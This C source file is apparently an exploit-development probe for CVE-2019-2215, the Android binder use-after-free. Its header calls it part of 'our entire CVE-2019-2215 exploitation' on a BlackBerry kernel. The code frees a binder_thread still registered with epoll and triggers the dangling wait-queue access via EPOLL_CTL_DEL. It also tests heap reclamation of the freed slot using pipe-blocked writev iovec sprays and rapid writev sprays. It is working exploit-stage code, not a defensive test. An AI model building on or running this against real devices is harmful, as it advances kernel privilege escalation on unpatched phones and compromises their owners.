/*
 * binder_poll_check.c — Verify binder_poll() exists and creates wait_queue entries
 *
 * CRITICAL ASSUMPTION CHECK: Our entire CVE-2019-2215 exploitation depends on
 * binder_poll() being present in the file_operations. If BlackBerry removed it,
 * the bug doesn't exist on this kernel.
 *
 * Test 1: poll() on binder fd
 *   - If binder_poll exists: poll() returns revents with specific binder events
 *   - If binder_poll absent: poll() returns DEFAULT_POLLMASK (POLLIN|POLLOUT|POLLRDNORM|POLLWRNORM = 0x145)
 *
 * Test 2: Verify epoll_wait sees binder events
 *
 * Test 3: UAF existence check — free thread, spray with garbage,
 *   trigger EPOLL_CTL_DEL and check for crash
 *
 * Test 4: Pipe iovec spray (P0 technique) — blocking writev to keep iovec in kernel
 *
 * Compile: aarch64-linux-musl-gcc -static -O2 -o binder_poll_check binder_poll_check.c -lpthread
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <stdint.h>
#include <linux/filter.h>

#define BINDER_THREAD_EXIT  _IOW('b', 8, int32_t)
#define BINDER_VERSION      _IOWR('b', 9, struct { signed long protocol_version; })
#define BINDER_WRITE_READ   _IOWR('b', 1, struct binder_write_read)

struct binder_write_read {
    signed long write_size;
    signed long write_consumed;
    unsigned long write_buffer;
    signed long read_size;
    signed long read_consumed;
    unsigned long read_buffer;
};

/* BC_ENTER_LOOPER command for binder */
#define BC_ENTER_LOOPER     _IO('c', 13)

static volatile int got_signal = 0;
static void sighandler(int sig) { got_signal = sig; }

/*
 * Test 1: Does binder_poll() exist?
 */
static void test_poll_exists(void) {
    printf("\n=== TEST 1: Does binder_poll() exist? ===\n");

    int bfd = open("/dev/binder", O_RDWR);
    if (bfd < 0) {
        printf("  binder open failed: %s\n", strerror(errno));
        return;
    }

    void *bmap = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, bfd, 0);
    if (bmap == MAP_FAILED) {
        printf("  binder mmap failed\n");
        close(bfd);
        return;
    }

    /* Create thread via BINDER_VERSION */
    struct { signed long protocol_version; } ver;
    ioctl(bfd, BINDER_VERSION, &ver);

    /* Test poll() with 0 timeout */
    struct pollfd pfd;
    pfd.fd = bfd;
    pfd.events = POLLIN | POLLOUT | POLLPRI;
    pfd.revents = 0;

    int ret = poll(&pfd, 1, 0);
    printf("  poll() ret=%d, revents=0x%04x\n", ret, pfd.revents);

    /* DEFAULT_POLLMASK = POLLIN|POLLOUT|POLLRDNORM|POLLWRNORM = 0x0001|0x0004|0x0040|0x0100 = 0x0145 */
    if (pfd.revents == 0x0145 || pfd.revents == 0x0045) {
        printf("  >>> binder_poll DOES NOT EXIST! revents matches DEFAULT_POLLMASK <<<\n");
        printf("  >>> CVE-2019-2215 is NOT exploitable on this kernel! <<<\n");
    } else if (pfd.revents == 0) {
        printf("  >>> binder_poll EXISTS! No events pending (correct for idle thread) <<<\n");
    } else {
        printf("  >>> binder_poll EXISTS with events: 0x%04x <<<\n", pfd.revents);
    }

    /* Also test with epoll_wait */
    printf("\n  Testing with epoll_wait:\n");
    int epfd = epoll_create1(0);
    struct epoll_event ev = { .events = EPOLLIN | EPOLLOUT, .data.fd = bfd };
    int add_ret = epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);
    printf("  epoll_ctl(ADD) ret=%d errno=%d\n", add_ret, errno);

    struct epoll_event events[4];
    int n = epoll_wait(epfd, events, 4, 0);
    printf("  epoll_wait(0ms) ret=%d\n", n);
    if (n > 0) {
        printf("  events[0].events=0x%04x\n", events[0].events);
    }

    /* Now enter looper and check again */
    printf("\n  After BC_ENTER_LOOPER:\n");
    uint32_t cmd = BC_ENTER_LOOPER;
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(cmd);
    bwr.write_buffer = (unsigned long)&cmd;
    int ioctl_ret = ioctl(bfd, BINDER_WRITE_READ, &bwr);
    printf("  BINDER_WRITE_READ(BC_ENTER_LOOPER) ret=%d errno=%d\n", ioctl_ret, errno);

    pfd.revents = 0;
    ret = poll(&pfd, 1, 0);
    printf("  poll() ret=%d, revents=0x%04x\n", ret, pfd.revents);

    close(epfd);
    munmap(bmap, 4096);
    close(bfd);
}

/*
 * Test 2: UAF existence — does EPOLL_CTL_DEL access freed memory?
 *
 * Strategy: Free binder_thread, don't spray, try EPOLL_CTL_DEL.
 * The freed memory still contains valid binder_thread data, so list_del succeeds.
 * But we check timing — if binder_poll didn't create a wait_queue entry,
 * EPOLL_CTL_DEL won't call remove_wait_queue at all.
 */
static void test_uaf_existence(void) {
    printf("\n=== TEST 2: UAF existence check ===\n");

    pid_t pid = fork();
    if (pid < 0) return;

    if (pid == 0) {
        struct sigaction sa;
        memset(&sa, 0, sizeof(sa));
        sa.sa_handler = sighandler;
        sigaction(SIGSEGV, &sa, NULL);
        sigaction(SIGBUS, &sa, NULL);
        sigaction(SIGABRT, &sa, NULL);

        int bfd = open("/dev/binder", O_RDWR);
        if (bfd < 0) _exit(1);
        void *bmap = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, bfd, 0);
        if (bmap == MAP_FAILED) { close(bfd); _exit(1); }

        struct { signed long protocol_version; } ver;
        ioctl(bfd, BINDER_VERSION, &ver);

        /* Enter looper first (like P0 PoC) */
        uint32_t cmd = BC_ENTER_LOOPER;
        struct binder_write_read bwr;
        memset(&bwr, 0, sizeof(bwr));
        bwr.write_size = sizeof(cmd);
        bwr.write_buffer = (unsigned long)&cmd;
        ioctl(bfd, BINDER_WRITE_READ, &bwr);

        /* Add to epoll */
        int epfd = epoll_create1(0);
        struct epoll_event ev = { .events = EPOLLIN, .data.fd = bfd };
        epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);
        printf("  epoll_ctl(ADD) done\n");

        /* Free thread */
        ioctl(bfd, BINDER_THREAD_EXIT, NULL);
        printf("  BINDER_THREAD_EXIT done\n");

        /* Allocate LOTS of other things to push the freed slot to be reused */
        /* Use open() to create file structs (struct file is ~256 bytes on arm64) */
        int fill_fds[512];
        int filled = 0;
        for (int i = 0; i < 512; i++) {
            fill_fds[i] = open("/dev/null", O_RDONLY);
            if (fill_fds[i] < 0) break;
            filled++;
        }
        printf("  filled %d file descriptors\n", filled);

        /* Now try EPOLL_CTL_DEL — if binder_poll created a wait_queue entry,
         * and the freed memory was overwritten by file structs,
         * this should crash (accessing garbage as wait_queue_head) */
        got_signal = 0;
        errno = 0;
        ev.events = EPOLLIN;
        int del_ret = epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, &ev);
        printf("  EPOLL_CTL_DEL: ret=%d errno=%d\n", del_ret, errno);
        if (got_signal)
            printf("  *** SIGNAL %d — UAF EXISTS AND TRIGGERED! ***\n", got_signal);
        else
            printf("  no signal — either no UAF or freed memory still valid\n");

        for (int i = 0; i < filled; i++) close(fill_fds[i]);
        close(epfd);
        munmap(bmap, 4096);
        close(bfd);
        _exit(got_signal ? 42 : 0);
    }

    alarm(15);
    int status;
    waitpid(pid, &status, 0);
    alarm(0);

    if (WIFEXITED(status))
        printf("  exit=%d (%s)\n", WEXITSTATUS(status),
               WEXITSTATUS(status) == 42 ? "UAF CONFIRMED" : "no crash");
    else if (WIFSIGNALED(status))
        printf("  killed by signal %d — UAF CONFIRMED\n", WTERMSIG(status));
}

/*
 * Test 3: Pipe iovec spray (P0 technique)
 *
 * Use writev on a full pipe to keep an iovec array allocated in kernel memory.
 * The iovec array goes through rw_copy_check_uvector → kmalloc.
 * If this kmalloc goes to regular kmalloc-* (not usercopy), it can reclaim.
 *
 * Detection: Use BPF SO_GET_FILTER readback on a marker filter.
 * If iovec reclaims a BPF filter's slot, the BPF readback would show no change
 * (BPF and iovec would be in different slots). So instead we check if iovec
 * reclaims the binder_thread by checking if EPOLL_CTL_DEL causes a crash
 * when the iovec data overlaps the wait_queue_head.
 */

struct pipe_spray_args {
    int pipe_wr;     /* write end of pipe */
    int n_iovecs;    /* number of iovec entries */
    int ready;       /* set to 1 when writev is called */
};

static void *pipe_writev_thread(void *arg) {
    struct pipe_spray_args *a = arg;

    /* Create iovec array with controlled addresses */
    struct iovec *iov = calloc(a->n_iovecs, sizeof(struct iovec));

    /* Fill iovec with pattern:
     * Each iovec is 16 bytes (ptr + len) on arm64
     * At the wait_queue_head offset, we want specific values
     *
     * For crash detection: put user-space address 0x4141414141410000
     * in the iov_base fields. If the iovec reclaims the binder_thread slot,
     * list_del will try to write to this address → crash.
     */
    char buf[32];
    memset(buf, 'A', sizeof(buf));

    for (int i = 0; i < a->n_iovecs; i++) {
        iov[i].iov_base = buf;     /* valid user address */
        iov[i].iov_len = 1;       /* write 1 byte */
    }

    a->ready = 1;

    /* This will block because pipe is full */
    ssize_t ret = writev(a->pipe_wr, iov, a->n_iovecs);
    /* We get here only when pipe is drained */

    free(iov);
    return (void *)(long)ret;
}

static void test_pipe_iovec_spray(int n_iovecs, int n_threads) {
    int total_size = n_iovecs * 16;  /* sizeof(struct iovec) = 16 on arm64 */
    int cache = total_size <= 256 ? 256 : total_size <= 512 ? 512 : 1024;

    printf("\n--- Pipe iovec: %d iovecs (%d bytes → kmalloc-%d), %d threads ---\n",
           n_iovecs, total_size, cache, n_threads);

    pid_t pid = fork();
    if (pid < 0) return;

    if (pid == 0) {
        struct sigaction sa;
        memset(&sa, 0, sizeof(sa));
        sa.sa_handler = sighandler;
        sigaction(SIGSEGV, &sa, NULL);
        sigaction(SIGBUS, &sa, NULL);

        /* Step 1: Open binder + epoll */
        int bfd = open("/dev/binder", O_RDWR);
        if (bfd < 0) { printf("  binder open failed\n"); _exit(1); }
        void *bmap = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, bfd, 0);
        if (bmap == MAP_FAILED) { close(bfd); _exit(1); }

        struct { signed long protocol_version; } ver;
        ioctl(bfd, BINDER_VERSION, &ver);

        /* Enter looper */
        uint32_t cmd = BC_ENTER_LOOPER;
        struct binder_write_read bwr;
        memset(&bwr, 0, sizeof(bwr));
        bwr.write_size = sizeof(cmd);
        bwr.write_buffer = (unsigned long)&cmd;
        ioctl(bfd, BINDER_WRITE_READ, &bwr);

        int epfd = epoll_create1(0);
        struct epoll_event ev = { .events = EPOLLIN, .data.fd = bfd };
        epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

        /* Step 2: Free thread */
        ioctl(bfd, BINDER_THREAD_EXIT, NULL);
        printf("  binder_thread FREED\n");

        /* Step 3: Create blocked writev threads */
        pthread_t *threads = calloc(n_threads, sizeof(pthread_t));
        struct pipe_spray_args *args = calloc(n_threads, sizeof(struct pipe_spray_args));
        int pipes_created = 0;

        for (int i = 0; i < n_threads; i++) {
            int pfd[2];
            if (pipe(pfd) < 0) break;

            /* Fill pipe to capacity */
            int flags = fcntl(pfd[1], F_GETFL);
            fcntl(pfd[1], F_SETFL, flags | O_NONBLOCK);
            char fill[4096];
            memset(fill, 0, sizeof(fill));
            while (write(pfd[1], fill, sizeof(fill)) > 0);
            fcntl(pfd[1], F_SETFL, flags);  /* Remove O_NONBLOCK */

            args[i].pipe_wr = pfd[1];
            args[i].n_iovecs = n_iovecs;
            args[i].ready = 0;

            if (pthread_create(&threads[i], NULL, pipe_writev_thread, &args[i]) != 0)
                break;
            pipes_created++;

            /* Wait for thread to call writev (which will block) */
            while (!args[i].ready) usleep(100);
            usleep(1000); /* Extra time for kernel to allocate iovec */
        }
        printf("  created %d blocking writev threads (%d iovecs each)\n",
               pipes_created, n_iovecs);

        /* Step 4: Trigger EPOLL_CTL_DEL */
        got_signal = 0;
        ev.events = EPOLLIN;
        int del_ret = epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, &ev);
        printf("  EPOLL_CTL_DEL: ret=%d errno=%d\n", del_ret, errno);
        if (got_signal)
            printf("  *** SIGNAL %d — IOVEC RECLAIM TRIGGERED! ***\n", got_signal);

        /* Cleanup: close pipe read ends to unblock writev threads */
        /* Actually we only have write ends in args. Need to track read ends too. */
        /* For simplicity, just exit — kernel will clean up */

        printf("  signal=%d\n", got_signal);
        _exit(got_signal ? 42 : 0);
    }

    alarm(15);
    int status;
    int wr = waitpid(pid, &status, 0);
    alarm(0);

    if (wr < 0) {
        printf("  TIMEOUT — writev may be hanging\n");
        kill(pid, SIGKILL);
        waitpid(pid, &status, 0);
    } else if (WIFEXITED(status)) {
        printf("  exit=%d (%s)\n", WEXITSTATUS(status),
               WEXITSTATUS(status) == 42 ? "RECLAIM!" : "no reclaim");
    } else if (WIFSIGNALED(status)) {
        printf("  killed by signal %d — POSSIBLE RECLAIM + CRASH\n", WTERMSIG(status));
    }
}

/*
 * Test 4: Direct iovec spray WITHOUT pipe (synchronous writev to /dev/null)
 * This won't keep iovec in memory, but tests if writev triggers any
 * interaction with the freed binder_thread
 */
static void test_direct_iovec(int n_iovecs) {
    printf("\n--- Direct iovec: %d iovecs (%d bytes) ---\n",
           n_iovecs, n_iovecs * 16);

    pid_t pid = fork();
    if (pid < 0) return;

    if (pid == 0) {
        struct sigaction sa;
        memset(&sa, 0, sizeof(sa));
        sa.sa_handler = sighandler;
        sigaction(SIGSEGV, &sa, NULL);
        sigaction(SIGBUS, &sa, NULL);

        int bfd = open("/dev/binder", O_RDWR);
        if (bfd < 0) _exit(1);
        void *bmap = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, bfd, 0);
        if (bmap == MAP_FAILED) { close(bfd); _exit(1); }

        struct { signed long protocol_version; } ver;
        ioctl(bfd, BINDER_VERSION, &ver);

        uint32_t cmd = BC_ENTER_LOOPER;
        struct binder_write_read bwr;
        memset(&bwr, 0, sizeof(bwr));
        bwr.write_size = sizeof(cmd);
        bwr.write_buffer = (unsigned long)&cmd;
        ioctl(bfd, BINDER_WRITE_READ, &bwr);

        int epfd = epoll_create1(0);
        struct epoll_event ev = { .events = EPOLLIN, .data.fd = bfd };
        epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

        ioctl(bfd, BINDER_THREAD_EXIT, NULL);
        printf("  thread freed\n");

        /* Rapid writev spray to /dev/null — iovec is allocated then freed quickly */
        int devnull = open("/dev/null", O_WRONLY);
        char buf[16];
        memset(buf, 'B', sizeof(buf));

        struct iovec *iov = calloc(n_iovecs, sizeof(struct iovec));
        for (int i = 0; i < n_iovecs; i++) {
            iov[i].iov_base = buf;
            iov[i].iov_len = 1;
        }

        /* Spray many writev calls, hoping one transiently reclaims the slot */
        int signals = 0;
        for (int round = 0; round < 1000; round++) {
            writev(devnull, iov, n_iovecs);
            /* After each writev, the iovec is freed. Check EPOLL_CTL_MOD */
            got_signal = 0;
            ev.events = EPOLLIN | EPOLLOUT;
            epoll_ctl(epfd, EPOLL_CTL_MOD, bfd, &ev);
            if (got_signal) { signals++; break; }
        }

        printf("  1000 writev rounds, signals=%d\n", signals);

        /* Final check with EPOLL_CTL_DEL */
        got_signal = 0;
        epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, &ev);
        printf("  EPOLL_CTL_DEL signal=%d\n", got_signal);

        free(iov);
        close(devnull);
        close(epfd);
        munmap(bmap, 4096);
        close(bfd);
        _exit(signals > 0 || got_signal ? 42 : 0);
    }

    alarm(15);
    int status;
    waitpid(pid, &status, 0);
    alarm(0);

    if (WIFEXITED(status))
        printf("  exit=%d\n", WEXITSTATUS(status));
    else if (WIFSIGNALED(status))
        printf("  killed by signal %d\n", WTERMSIG(status));
}

int main(void) {
    printf("=== BINDER POLL CHECK & UAF VERIFICATION ===\n");
    printf("uid=%u\n", getuid());

    /* Test 1: Does binder_poll() exist? */
    test_poll_exists();

    /* Test 2: UAF existence */
    test_uaf_existence();

    /* Test 3: Pipe iovec spray at various sizes */
    printf("\n=== TEST 3: Pipe iovec spray ===\n");
    /* kmalloc-512: 20-32 iovec entries (320-512 bytes) */
    test_pipe_iovec_spray(20, 64);   /* 320 bytes */
    test_pipe_iovec_spray(25, 64);   /* 400 bytes */
    test_pipe_iovec_spray(32, 64);   /* 512 bytes */
    /* kmalloc-256: 16 iovec entries */
    test_pipe_iovec_spray(16, 64);   /* 256 bytes */

    /* Test 4: Rapid writev spray */
    printf("\n=== TEST 4: Rapid writev spray ===\n");
    test_direct_iovec(20);  /* kmalloc-512 */
    test_direct_iovec(32);  /* kmalloc-512 */

    printf("\n=== ALL TESTS COMPLETE ===\n");
    return 0;
}
